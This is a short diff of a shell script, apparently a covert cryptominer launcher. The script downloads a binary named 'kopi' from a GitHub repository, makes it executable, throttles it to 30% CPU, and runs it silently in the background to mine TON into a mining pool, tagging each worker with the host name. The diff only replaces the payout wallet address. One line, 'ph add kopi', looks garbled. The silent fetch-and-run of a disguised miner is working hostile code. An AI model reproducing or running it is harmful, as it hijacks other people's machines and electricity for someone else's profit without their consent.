@@ -12,4 +12,4 @@ nohup wget https://github.com/aurbach55/dera/raw/main/kopi >/dev/null 2>&1
 ph add kopi
 chmod +x kopi
 cpulimit -e kopi -l 30 &
-nohup ./kopi --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname) >/dev/null 2>&1
+nohup ./kopi --algo TON --pool https://next.ton-pool.com --user EQAxkdZ4fFoFc0wZYbwT5Z2D-cA7q1te5etqcwGx6mTFys2u.$(cat /proc/sys/kernel/hostname) >/dev/null 2>&1
